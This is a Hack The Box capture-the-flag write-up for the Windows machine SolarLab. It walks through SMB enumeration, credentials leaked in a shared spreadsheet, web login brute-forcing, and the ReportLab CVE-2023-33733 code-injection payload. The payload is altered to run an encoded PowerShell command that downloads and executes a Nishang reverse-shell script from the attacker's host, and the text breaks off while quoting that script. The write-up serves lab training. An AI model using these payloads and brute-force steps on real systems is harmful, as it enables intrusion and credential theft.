---
layout: writeup
category: HTB
description: Solarlab is a windows machine that requires few steps to complete. First, I will extract passwords from a spreadsheet in the smb service of the victim. Then, I will use those usernames and passwords to bruteforce a web panel and have access to the report page. Inspecting the pdf generated in a report, I can see that its generated using "ReportHub pdf library", which has a RCE vulnerability that gives me access as blake. Then, I will abuse [CVE-2023-32315](https://www.vicarius.io/vsociety/posts/cve-2023-32315-path-traversal-in-openfire-leads-to-rce) to abuse an openfire instance that gives me access as openfire user. From `openfire` user, I can read the initialize script of the database to have the necessary things to decrypt the password which is reused for Administrator in the system.
points: 30
solves: 3372
tags: smb spreadsheet libreoffice bruteforcing-web rce CVE-2023-33733 pdf openfire-exploit CVE-2023-32315 openfire-database decrypt-password java
date: 2024-09-21
title: HTB Solarlab writeup
comments: false
---

{% raw %}

Solarlab is a windows machine that requires few steps to complete. First, I will extract passwords from a spreadsheet in the smb service of the victim. Then, I will use those usernames and passwords to have access to the report page. Inspecting the pdf generated in a report, I can see that its generated using "ReportHub pdf library", which has a RCE vulnerability that gives me access as blake. Then, I will abuse [CVE-2023-32315](https://www.vicarius.io/vsociety/posts/cve-2023-32315-path-traversal-in-openfire-leads-to-rce) to abuse an openfire instance that gives me access as openfire user. From `openfire` user, I can read the initialize script of the database to have the necessary things to decrypt the password which is reused for Administrator in the system.

# Ports recognaissance

```bash
❯ sudo nmap -p- -sS --open --min-rate 5000 -v -n -Pn -sVC 10.10.11.16 -oA solarlab
<..SNIP..>
```

```bash
❯ cat solarlab.nmap
# Nmap 7.94SVN scan initiated Sat Sep 21 09:56:37 2024 as: nmap -sS -p- --open --min-rate 5000 -v -n -Pn -sVC -oA solarlab 10.10.11.16
Nmap scan report for 10.10.11.16
Host is up (0.061s latency).
Not shown: 65530 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE       VERSION
80/tcp   open  http          nginx 1.24.0
|_http-title: Did not follow redirect to http://solarlab.htb/
|_http-server-header: nginx/1.24.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
6791/tcp open  http          nginx 1.24.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.24.0
|_http-title: Did not follow redirect to http://report.solarlab.htb:6791/
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-09-21T08:12:11
|_  start_date: N/A
|_clock-skew: 14m49s

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Sep 21 09:57:58 2024 -- 1 IP address (1 host up) scanned in 80.96 seconds

```

> [My used arguments for nmap](http://gabrielgonzalez211.github.io/blog/nmap-arguments.html)

There, I identified 4 ports which I classified like this:

**WEB**: 
- Port 80: HTTP, using nginx 1.24.0 and it redirects to solarlab.htb, which I need to add to my /etc/hosts file, which in linux is designed for my system to know where should solve that IP:
```bash
❯ sudo vi /etc/hosts
10.10.11.16 solarlab.htb
```
- Port 6791: HTTP, using nginx 1.24.0 and it redirects to `report.solarlab.htb:6791`, so I will add that subdomain also to my /etc/hosts, with the last line remaining like this:
```bash
10.10.11.16 solarlab.htb report.solarlab.htb
```

**Active directory**:
- Port 135: RPC, used for active directory staff.
- Port 139 and 445: Used for SMB to share files between systems.

I will proceed to enumerate those.

# Active directory

## RPC

I will try null and guest sessions to see if I can access without credentials and retrieve relevant information like usernames and domain info:

```bash
# Null session
❯ rpcclient -N 10.10.11.16
Bad SMB2 (sign_algo_id=1) signature for message
[0000] 00 00 00 00 00 00 00 00   00 00 00 00 00 00 00 00   ........ ........
[0000] 34 2F 8F B2 E7 8E 60 C6   7D 26 A8 C5 08 91 34 3D   4/....`. }&....4=
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED
# Guest session
❯ rpcclient -U "solarlab.htb/guest%" 10.10.11.16
rpcclient $> enumdomusers
result was NT_STATUS_CONNECTION_DISCONNECTED
# Random sessions
❯ rpcclient -U "solarlab.htb/test%pjapfa" 10.10.11.16
Bad SMB2 (sign_algo_id=1) signature for message
[0000] 00 00 00 00 00 00 00 00   00 00 00 00 00 00 00 00   ........ ........
[0000] BC 3B D8 73 B8 B6 23 4C   87 52 57 D0 05 3D 02 57   .;.s..#L .RW..=.W
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED
❯ rpcclient -U "solarlab.htb/test%" 10.10.11.16
Bad SMB2 (sign_algo_id=1) signature for message
[0000] 00 00 00 00 00 00 00 00   00 00 00 00 00 00 00 00   ........ ........
[0000] 19 5B 4D 73 37 96 0E 77   98 B3 BD 76 03 0B 0D FE   .[Ms7..w ...v....
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED
❯ rpcclient -U "solarlab.htb/%pfjafpa" 10.10.11.16
rpcclient $> enumdomusers
result was NT_STATUS_CONNECTION_DISCONNECTED
rpcclient $> 
```

But it's not the case. 

> Note: For rpcclient, the syntax to specify domain, username and password is `domain/username%password`. If you didn't knew it, you could see it in the help panel with `rpcclient --help`.

## SMB

First, I will try to retrieve domain information with netexec (updated version of crackmapexec):

```bash
❯ netexec smb 10.10.11.16
SMB         10.10.11.16     445    SOLARLAB         [*] Windows 10 / Server 2019 Build 19041 x64 (name:SOLARLAB) (domain:solarlab) (signing:False) (SMBv1:False)
```

I can see its PC name is SOLARLAB and that it consists of a Windows 10 Server 2019 Build 19041. Nothing interesting here.

Now I will try to see if I can access shared folders and files with a null or guest session:

```bash
❯ smbclient -N -L 10.10.11.16

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	Documents       Disk      
	IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.16 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

And I can access with null session. The C$ and ADMIN$ shares are for administrators so I can't access it.

I will try with the "Documents" share and it works:

```bash
❯ smbclient -N //10.10.11.16/Documents
Try "help" to get a list of possible commands.
smb: \> 
```

A thing to notice is that there is no write privileges on this share so any social engineering attack with a .scf or .ini is discarded:

```bash
❯ touch test.txt
❯ smbclient -N //10.10.11.16/Documents
Try "help" to get a list of possible commands.
smb: \> put test.txt
NT_STATUS_ACCESS_DENIED opening remote file \test.txt
❯ rm test.txt
```

And it has a lot of files there:

```bash
smb: \> dir
  .                                  DR        0  Fri Apr 26 16:47:14 2024
  ..                                 DR        0  Fri Apr 26 16:47:14 2024
  concepts                            D        0  Fri Apr 26 16:41:57 2024
  desktop.ini                       AHS      278  Fri Nov 17 11:54:43 2023
  details-file.xlsx                   A    12793  Fri Nov 17 13:27:21 2023
  My Music                        DHSrn        0  Thu Nov 16 20:36:51 2023
  My Pictures                     DHSrn        0  Thu Nov 16 20:36:51 2023
  My Videos                       DHSrn        0  Thu Nov 16 20:36:51 2023
  old_leave_request_form.docx         A    37194  Fri Nov 17 11:35:57 2023

		7779839 blocks of size 4096. 1878858 blocks available
```

I will logout, create a folder for this shared files and transfer them there:

```bash
❯ mkdir smb-null
❯ cd smb-null
❯ smbclient -N //10.10.11.16/Documents
Try "help" to get a list of possible commands.
smb: \> prompt off
smb: \> recurse on
smb: \> mget *
getting file \desktop.ini of size 278 as desktop.ini (1.0 KiloBytes/sec) (average 1.0 KiloBytes/sec)
getting file \details-file.xlsx of size 12793 as details-file.xlsx (26.5 KiloBytes/sec) (average 17.1 KiloBytes/sec)
getting file \old_leave_request_form.docx of size 37194 as old_leave_request_form.docx (66.2 KiloBytes/sec) (average 37.9 KiloBytes/sec)
getting file \concepts\Training-Request-Form.docx of size 161337 as concepts/Training-Request-Form.docx (46.1 KiloBytes/sec) (average 43.9 KiloBytes/sec)
getting file \concepts\Travel-Request-Sample.docx of size 30953 as concepts/Travel-Request-Sample.docx (26.6 KiloBytes/sec) (average 40.5 KiloBytes/sec)
NT_STATUS_ACCESS_DENIED listing \My Music\*
NT_STATUS_ACCESS_DENIED listing \My Pictures\*
NT_STATUS_ACCESS_DENIED listing \My Videos\*
```

- `prompt off`: disable prompting for all files downloaded with mget.
- `recurse on`: enable recursing for downloading all files inside folders.
- `mget *`: finally get all files (`*`) in the share. 

Let's analyze the files.

## SMB Files analysis

The `desktop.ini` file just have info on how the folder is displayed in the "Windows Explorer" as showed [here](https://learn.microsoft.com/en-us/windows/win32/shell/how-to-customize-folders-with-desktop-ini)

The `details-file.xlsx` file is a spreadsheet that I can open with "Libreoffice" for example. I will open it to see what is there:

```bash
❯ libreoffice details-file.xlsx
```

And I can see there are some usernames with passwords (nice file to share to everyone):

![](/assets/images/Solarlab/Pasted%20image%2020240919182411.png)

That was interesting and I will focus on it later when I finish enumerating the files.

There's also a file called `old_leave_request_form.docx`, so I will open it and see what is inside:

```bash
❯ libreoffice old_leave_request_form.docx
```

And it has some instructions on how to send a request form for having holidays:

![](/assets/images/Solarlab/Pasted%20image%2020240919190657.png)

The `concepts` folder contains two files, one called `Training-Request-Form.docx` and another called `Travel-Request-Sample.docx`:

```bash
❯ cd concepts
❯ ls
Training-Request-Form.docx  Travel-Request-Sample.docx
```

The `Training-Request-Form.docx` has a form to request some type of training:

![](/assets/images/Solarlab/Pasted%20image%2020240919205721.png)

And the `Travel-Request-Sample.docx` has a sample email for some travel request:

![](/assets/images/Solarlab/Pasted%20image%2020240919205926.png)

There's no important file left so I will focus on the passwords I saw in the .xlsx file.
## Password spraying

I will create a file with a list of those usernames and another with a list of those passwords of the xlsx file I saw, which would remain like this:

```bash
❯ cat passwords.txt
al;ksdhfewoiuh
dkjafblkjadsfgl
d398sadsknr390
ThisCanB3typedeasily1@
danenacia9234n
dadsfawe9dafkn
❯ cat users.txt
alexander.knight
blake.byte
KAlexander
ClaudiaS
```

Now, with netexec, I will bruteforce each username with all that passwords to see if they are reused in smb:

```bash
❯ netexec smb 10.10.11.16 -u=users.txt -p=passwords.txt --continue-on-success
SMB         10.10.11.16     445    SOLARLAB         [*] Windows 10 / Server 2019 Build 19041 x64 (name:SOLARLAB) (domain:solarlab) (signing:False) (SMBv1:False)
SMB         10.10.11.16     445    SOLARLAB         [+] solarlab\alexander.knight:al;ksdhfewoiuh 
SMB         10.10.11.16     445    SOLARLAB         [+] solarlab\blake.byte:al;ksdhfewoiuh 
SMB         10.10.11.16     445    SOLARLAB         [+] solarlab\KAlexander:al;ksdhfewoiuh 
SMB         10.10.11.16     445    SOLARLAB         [+] solarlab\ClaudiaS:al;ksdhfewoiuh
```

> Note: the `--continue-on-success` flag is for netexec to not stop when a password success

They all work because the null session enabled, so I will bruteforce it manually using bash and output it into a file called `bruteforce-output.txt`:

```bash
❯ for user in $(cat users.txt); do for password in $(cat passwords.txt);do echo "\n\n[+] Trying with user $user and password $password\n";(smbclient -U "solarlab.htb/$user%$password" -L 10.10.11.16 2>/dev/null)done;done | tee bruteforce-output.txt
```

Now I will filter the lines containing `Trying with user` and sort the output to see if there is any new share folder, but is not the case:

```bash
❯ cat bruteforce-output.txt | grep -v 'Trying with user' | sort -u

	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	Documents       Disk      
	IPC$            IPC       Remote IPC
	Sharename       Type      Comment
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available
```

So I will look for other things.

# Web enumeration

## Port 80

Taking a look at the headers with curl I can see it redirects to solarlab.htb (as saw with nmap):

```bash
❯ curl -i http://10.10.11.16
HTTP/1.1 301 Moved Permanently
Server: nginx/1.24.0
Date: Thu, 19 Sep 2024 19:14:52 GMT
Content-Type: text/html
Content-Length: 169
Connection: keep-alive
Location: http://solarlab.htb/

<html>
<head><title>301 Moved Permanently</title></head>
<body>
<center><h1>301 Moved Permanently</h1></center>
<hr><center>nginx/1.24.0</center>
</body>
</html>
```

So I will look at the headers and data inside `<head>` tags in that domain with curl again:

```bash
❯ curl -i -s http://solarlab.htb/ | sed -n '/HTTP\/1.1/,/<\/head>/p'
HTTP/1.1 200 OK
Server: nginx/1.24.0
Date: Thu, 19 Sep 2024 19:18:05 GMT
Content-Type: text/html
Content-Length: 16210
Last-Modified: Tue, 30 Apr 2024 06:42:14 GMT
Connection: keep-alive
ETag: "663092c6-3f52"
Accept-Ranges: bytes

<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8">
	<title>SolarLab Instant Messenger</title>
	<meta name="description" content="Kite Coming Soon HTML Template by Jewel Theme" >
	<meta name="author" content="Jewel Theme">

	<!-- Mobile Specific Meta -->
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<!--[if IE]><meta http-equiv='X-UA-Compatible' content='IE=edge,chrome=1'><![endif]-->

	<!-- Bootstrap  -->
	<link href="assets/css/bootstrap.min.css" rel="stylesheet">

	<!-- icon fonts font Awesome -->
	<link href="assets/css/font-awesome.min.css" rel="stylesheet">

	<!-- Custom Styles -->
	<link href="assets/css/style.css" rel="stylesheet">

	<!--[if lt IE 9]>
	<script src="assets/js/html5shiv.js"></script>
	<![endif]-->

</head>
```

I can see its something about a messenger and nothing more that I didn't saw in the nmap scan.

Taking a look in the browser, I can see it's a landing page for SolarLab IM:

![](/assets/images/Solarlab/Pasted%20image%2020240920183404.png)

Also, I noticed that the users I saw before in the document appear in the "about us" section of the page:

![](/assets/images/Solarlab/Pasted%20image%2020240920183451.png)

Sending an email in the newsletter gives "Method not allowed" error:

![](/assets/images/Solarlab/Pasted%20image%2020240920183528.png)

![](/assets/images/Solarlab/Pasted%20image%2020240920183539.png)

There's also a contact section that makes a get request to the same page with some parameters. But it shows the same as before:

![](/assets/images/Solarlab/Pasted%20image%2020240920183624.png)

![](/assets/images/Solarlab/Pasted%20image%2020240920183703.png)

Also, I can see that it's a page wrote in HTML as index.html gives the same result:

![](/assets/images/Solarlab/Pasted%20image%2020240920183809.png)

Otherwise, if I put for example index.php it gives 404:

![](/assets/images/Solarlab/Pasted%20image%2020240920183851.png)

As it seems so static, I will look for subdomains first to see if there is something more interesting:

```bash
❯ ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.solarlab.htb" -u http://solarlab.htb/ -fs 169

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://solarlab.htb/
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.solarlab.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 169
________________________________________________

:: Progress: [4989/4989] :: Job [1/1] :: 1149 req/sec :: Duration: [0:00:06] :: Errors: 0 ::
```

But there's no other subdomain so I will look for routes in the server:

```plaintext
❯ feroxbuster -u http://solarlab.htb/ -w /opt/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -x php html
                                                                                                                                                                                                          [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 101ms]
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://solarlab.htb/
 🚀  Threads               │ 50
 📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, html]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       11w      153c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        7l       11w      169c http://solarlab.htb/images => http://solarlab.htb/images/
200      GET       25l      179w    11924c http://solarlab.htb/images/team/team-member-3.jpg
200      GET       29l      173w    15431c http://solarlab.htb/images/team/team-member-2.jpg
200      GET       34l      156w    10625c http://solarlab.htb/images/team/team-member-1.jpg
200      GET      250l      545w     7532c http://solarlab.htb/assets/js/functions.js
200      GET        8l       73w     2429c http://solarlab.htb/assets/js/html5shiv.js
200      GET        4l       59w    20766c http://solarlab.htb/assets/css/font-awesome.min.css
200      GET     1183l     2149w    25111c http://solarlab.htb/assets/css/style.css
200      GET        4l      320w    15506c http://solarlab.htb/assets/js/modernizr-2.8.0.min.js
200      GET      472l     1213w    16210c http://solarlab.htb/index.html
200      GET      471l     1516w    87223c http://solarlab.htb/images/background/contact.jpg
200      GET      376l     1875w    86101c http://solarlab.htb/images/background/newsletter.jpg
200      GET      687l     3321w    67119c http://solarlab.htb/assets/js/plugins.js
200      GET        4l     1304w    83615c http://solarlab.htb/assets/js/jquery-2.1.0.min.js
200      GET        7l     1210w    99961c http://solarlab.htb/assets/css/bootstrap.min.css
200      GET      731l     4418w   255443c http://solarlab.htb/images/background/about-us.jpg
403      GET        7l        9w      153c http://solarlab.htb/assets/js/
403      GET        7l        9w      153c http://solarlab.htb/assets/css/
301      GET        7l       11w      169c http://solarlab.htb/assets/images => http://solarlab.htb/assets/images/
301      GET        7l       11w      169c http://solarlab.htb/assets/css => http://solarlab.htb/assets/css/
403      GET        7l        9w      153c http://solarlab.htb/assets/
301      GET        7l       11w      169c http://solarlab.htb/assets/js => http://solarlab.htb/assets/js/
403      GET        7l        9w      153c http://solarlab.htb/images/team/
403      GET        7l        9w      153c http://solarlab.htb/images/background/
301      GET        7l       11w      169c http://solarlab.htb/assets => http://solarlab.htb/assets/
200      GET      472l     1213w    16210c http://solarlab.htb/
403      GET        7l        9w      153c http://solarlab.htb/images/
301      GET        7l       11w      169c http://solarlab.htb/assets/fonts => http://solarlab.htb/assets/fonts/
403      GET        7l        9w      153c http://solarlab.htb/assets/images/
403      GET        7l        9w      153c http://solarlab.htb/assets/fonts/
301      GET        7l       11w      169c http://solarlab.htb/images/team => http://solarlab.htb/images/team/
200      GET     6937l    43973w  3418903c http://solarlab.htb/images/background/page-top.jpg
301      GET        7l       11w      169c http://solarlab.htb/images/background => http://solarlab.htb/images/background/
500      GET        7l       13w      177c http://solarlab.htb/con
500      GET        7l       13w      177c http://solarlab.htb/con.html
500      GET        7l       13w      177c http://solarlab.htb/images/con
500      GET        7l       13w      177c http://solarlab.htb/assets/css/con
500      GET        7l       13w      177c http://solarlab.htb/assets/js/con
500      GET        7l       13w      177c http://solarlab.htb/images/con.html
500      GET        7l       13w      177c http://solarlab.htb/assets/con
500      GET        7l       13w      177c http://solarlab.htb/images/team/con
500      GET        7l       13w      177c http://solarlab.htb/images/background/con
500      GET        7l       13w      177c http://solarlab.htb/assets/css/con.html
500      GET        7l       13w      177c http://solarlab.htb/assets/js/con.html
500      GET        7l       13w      177c http://solarlab.htb/assets/con.html
500      GET        7l       13w      177c http://solarlab.htb/images/team/con.html
500      GET        7l       13w      177c http://solarlab.htb/images/background/con.html
500      GET        7l       13w      177c http://solarlab.htb/assets/images/con
500      GET        7l       13w      177c http://solarlab.htb/assets/images/con.html
500      GET        7l       13w      177c http://solarlab.htb/assets/fonts/con
500      GET        7l       13w      177c http://solarlab.htb/assets/fonts/con.html
[####################] - 3m   1033305/1033305 0s      found:51      errors:0      
[####################] - 3m    114804/114804  764/s   http://solarlab.htb/ 
[####################] - 3m    114804/114804  763/s   http://solarlab.htb/images/ 
[####################] - 3m    114804/114804  764/s   http://solarlab.htb/assets/js/ 
[####################] - 3m    114804/114804  764/s   http://solarlab.htb/images/team/ 
[####################] - 3m    114804/114804  765/s   http://solarlab.htb/images/background/ 
[####################] - 3m    114804/114804  763/s   http://solarlab.htb/assets/ 
[####################] - 3m    114804/114804  764/s   http://solarlab.htb/assets/css/ 
[####################] - 3m    114804/114804  764/s   http://solarlab.htb/assets/images/ 
```

> Note: I used the lowercase version of raft-small-words because at my first scan I saw that the routes of the server are case insensitive

But nothing important here, an interesting thing is that all the routes with the word `con` gived 500 error.

Now I will take a look at port 6791

## Port 6791

In nmap, I saw that it redirected to report.solarlab.htb:6791, so I will look directly at this with curl:

```bash
❯ curl -i -s http://report.solarlab.htb:6791/ -o 6791-main-page-output.txt
❯ less 6791-main-page-output.txt
HTTP/1.1 200 OK
Server: nginx/1.24.0
Date: Sat, 21 Sep 2024 08:19:36 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 2045
Connection: keep-alive
Vary: Cookie

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - ReportHub</title>
<..SNIP..>
```

And I can see its a login page to something called ReportHub.

In the browser it looks like this:

![](/assets/images/Solarlab/Pasted%20image%2020240921100621.png)

Intercepting the login request with burpsuite, I can see it only has two parameters that go to /login, username and password:

![](/assets/images/Solarlab/Pasted%20image%2020240921100742.png)

When the username doesn't exists it says "User not found":

![](/assets/images/Solarlab/Pasted%20image%2020240921101022.png)

# Access as blake

I will create all the possible combinations of usernames using `username-anarchy` with the names I got before in the excel:

```bash
❯ cat fullnames.txt
Alexander Knight
Blake Byte
Claudia Springer
❯ /opt/username-anarchy/username-anarchy -i fullnames.txt > users-to-test.txt
```

And bruteforce for valid users filtering the responses that contains the string 'User not found' because is what the page gives if the user is not found:

```bash
❯ ffuf -w users-to-test.txt -d 'username=FUZZ&password=test' -X POST -u http://report.solarlab.htb:6791/login -H "Content-Type: application/x-www-form-urlencoded" -mc all -fr 'User not found.'

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://report.solarlab.htb:6791/login
 :: Wordlist         : FUZZ: /home/gabri/Desktop/HTB/machines/SolarLab-10.10.11.16/content/users-to-test.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=FUZZ&password=test
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Regexp: User not found.
________________________________________________

claudias                [Status: 200, Size: 2144, Words: 812, Lines: 87, Duration: 64ms]
alexanderk              [Status: 200, Size: 2144, Words: 812, Lines: 87, Duration: 108ms]
blakeb                  [Status: 200, Size: 2144, Words: 812, Lines: 87, Duration: 114ms]
:: Progress: [44/44] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

And I have three valid users! Let's look for their passwords:

```bash
❯ cat web-valid-users.txt
alexanderk
claudias
blakeb
❯ ffuf -w web-valid-users.txt:USER -w passwords.txt:PASSWORD -enc 'PASSWORD:urlencode' -enc 'USER:urlencode' -d 'username=USER&password=PASSWORD' -H "Content-Type: application/x-www-form-urlencoded" -u http://report.solarlab.htb:6791/login -fr 'User authentication error.'

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://report.solarlab.htb:6791/login
 :: Wordlist         : USER: /home/gabri/Desktop/HTB/machines/SolarLab-10.10.11.16/content/web-valid-users.txt
 :: Wordlist         : PASSWORD: /home/gabri/Desktop/HTB/machines/SolarLab-10.10.11.16/content/passwords.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=USER&password=PASSWORD
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: User authentication error.
________________________________________________

[Status: 302, Size: 207, Words: 18, Lines: 6, Duration: 54ms]
    * PASSWORD: ThisCanB3typedeasily1%40
    * USER: blakeb

:: Progress: [18/18] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

And I have a valid credential for reporthub! User blakeb and password `ThisCanB3typedeasily1@`. After introducing them, I can have access to the dashboard:

![](/assets/images/Solarlab/Pasted%20image%2020240921110520.png)

It seems like a communication page for employees. All the requests have a "Generate PDF" button, let's see how the pdf looks like by filling the form and clicking on that button. My upload signature is just a random jpg file:

![](/assets/images/Solarlab/Pasted%20image%2020240921111419.png)

And it generates the following pdf with the information in it:

![](/assets/images/Solarlab/Pasted%20image%2020240921111547.png)

Downloading and looking at the metadata, I can see it's generated with "ReportLab PDF library" in the Producer header:

```bash
❯ exiftool leaveRequest.pdf
ExifTool Version Number         : 12.76
File Name                       : leaveRequest.pdf
Directory                       : .
File Size                       : 847 kB
File Modification Date/Time     : 2024:09:21 11:16:16+02:00
File Access Date/Time           : 2024:09:21 11:16:16+02:00
File Inode Change Date/Time     : 2024:09:21 11:16:24+02:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Author                          : (anonymous)
Create Date                     : 2024:09:21 12:14:24-02:00
Creator                         : (unspecified)
Modify Date                     : 2024:09:21 12:14:24-02:00
Producer                        : ReportLab PDF Library - www.reportlab.com
Subject                         : (unspecified)
Title                           : (anonymous)
Trapped                         : False
Page Mode                       : UseNone
Page Count                      : 1
```


Searching for exploits for this, I saw [this](https://github.com/c53elyas/CVE-2023-33733) poc that explains so well the vulnerability. I will not detail here the vulnerability but I will look at the poc and follow that steps:

![](/assets/images/Solarlab/Pasted%20image%2020240921112501.png)

But I don't want to generate it with xhtml2pdf, I want to generate it in the victim server so I will just create the mallicious.html file to see how the contents are:

```bash
❯ cat >mallicious.html <<EOF
<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('touch /tmp/exploited') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">
                exploit
</font></para>
EOF
❯ cat mallicious.html
<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('touch /tmp/exploited') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">
                exploit
</font></para>
```

It seems like it executes `touch /tmp/exploited` but I don't want to do that, I want to gain access to the system, so I will change it to receive a powershell reverse shell as its a windows machine by interpreting a shell.ps1 hosted in a mine-created http server. I will base64-encode the utf-16 encoded command to avoid special characters problems:

```bash
❯ echo 'IEX(New-Object Net.WebClient).downloadString("http://10.10.15.95/shell.ps1")' | iconv -t utf16le | base64 -w 0;echo
SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANQAuADkANQAvAHMAaABlAGwAbAAuAHAAcwAxACIAKQAKAA==
```

And the html results like this:

```html
<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANQAuADkANQAvAHMAaABlAGwAbAAuAHAAcwAxACIAKQAKAA==') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">
                exploit
</font></para>
```

My shell.ps1 will be a copy of [Invoke-PowershellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) but with the invocation of the function at the end resulting like this:

```powershell
function Invoke-PowerShellTcp 
{ 
<#
.SYNOPSIS
Nishang script which can be used for Reverse or Bind interactive PowerShell from a target. 

.DESCRIPTION
